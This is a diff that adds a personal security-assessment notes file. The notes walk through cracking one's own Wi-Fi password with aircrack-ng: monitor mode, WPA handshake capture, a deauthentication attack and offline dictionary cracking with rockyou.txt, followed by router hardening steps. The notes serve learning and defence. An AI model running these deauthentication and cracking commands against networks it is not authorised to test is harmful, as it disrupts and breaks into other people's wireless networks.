@@ -1,1 +1,130 @@
+Wi-Fi Security Assessment Notes (aircrack-ng)
+==============================================
+Author: Ayush  
+Tool: aircrack-ng (Kali Linux)  
+Scope: Personal/Authorized Wi-Fi Network Only  
+
+1. Objective
+------------
+To evaluate the strength of my own Wi-Fi password using a legal, offline cracking method.  
+This helps understand wireless security, detect weak configurations, and apply hardening.
+
+2. Rules of Engagement (Legal & Ethical)
+----------------------------------------
+- Only my personal Wi-Fi network was tested.
+- No unknown or unauthorized networks were targeted.
+- Assessment was done strictly for learning & defensive security improvement.
+
+3. Tools & Environment
+----------------------
+- OS: Kali Linux
+- Wireless Adapter: Supports monitor mode + packet injection
+- Toolset:
+  - airmon-ng
+  - airodump-ng
+  - aireplay-ng
+  - aircrack-ng
+
+4. Complete Workflow + Commands
+-------------------------------
+
+STEP 1 — Enable Monitor Mode
+----------------------------
+# Identify wireless interface
+ifconfig  
+iwconfig
+
+# Stop interface (optional)
+sudo ifconfig wlan0 down
+
+# Start monitor mode
+sudo airmon-ng start wlan0
+
+# Monitor interface becomes:
+wlan0mon
+
+STEP 2 — Scan Wireless Networks (Only for identifying my own router)
+--------------------------------------------------------------------
+sudo airodump-ng wlan0mon
+
+(Here I noted my own network’s BSSID, channel, and ESSID.  
+No third-party network was captured or saved.)
+
+STEP 3 — Capture Handshake of My Own Wi-Fi Network
+---------------------------------------------------
+sudo airodump-ng --bssid <MY_BSSID> --channel <CH> -w capture wlan0mon
+
+Output generated:
+capture.cap  
+capture-01.cap  
+capture-01.csv  
+capture-01.kismet.csv  
+
+STEP 4 — Optional: Deauthentication (ON MY OWN NETWORK ONLY)
+--------------------------------------------------------------
+This forces my own device to reconnect and generate a handshake.
+
+sudo aireplay-ng --deauth 10 -a <MY_BSSID> wlan0mon
+
+Handshake appears in top right of airodump-ng.
+
+STEP 5 — Offline Password Testing
+---------------------------------
+Using a wordlist (rockyou.txt or custom list):
+
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+
+If cracked:
+[KEY FOUND] -> <password>
+
+If not cracked:
+"Passphrase not in dictionary"
+
+(No password is stored in this file.)
+
+STEP 6 — Disable Monitor Mode & Restore Adapter
+------------------------------------------------
+sudo airmon-ng stop wlan0mon  
+sudo service NetworkManager restart
+
+5. Findings (Fill Based on Your Results)
+----------------------------------------
+- Encryption: WPA2/WPA3  
+- Handshake: Successful  
+- Crack Result: Yes / No  
+- Time Taken: Short / Medium / Long  
+- Password Strength: Weak / Medium / Strong  
+
+*No sensitive details (MAC/BSSID/password) are included.*
+
+6. Security Risks Identified
+----------------------------
+- Weak or dictionary-based passwords are easily broken via offline attacks.  
+- Short passwords (<10 characters) reduce security significantly.  
+- Using names, DOB, phone numbers increases risk.
+
+7. Hardening Actions Performed
+------------------------------
+After the test, I secured my Wi-Fi by:
+
+- Setting a **14+ character strong password** (random, symbols, uppercase/lowercase).
+- Verifying router uses **WPA2/WPA3** encryption.
+- Disabling **WPS**.
+- Separating IoT devices using Guest network (optional).
+- Updating router firmware.
+
+8. Key Learnings
+----------------
+- aircrack-ng demonstrates how attackers exploit weak wireless passwords.
+- A strong passphrase is the simplest and most effective defense.
+- Wireless security includes both technical settings and password hygiene.
+
+9. Ethical Notice
+-----------------
+This workflow must **ONLY** be used on networks you own or have full permission for.  
+Unauthorized Wi-Fi cracking is illegal.  
+This file is for learning and defensive cybersecurity only.
+
+--------------------------------------
+End of File
 
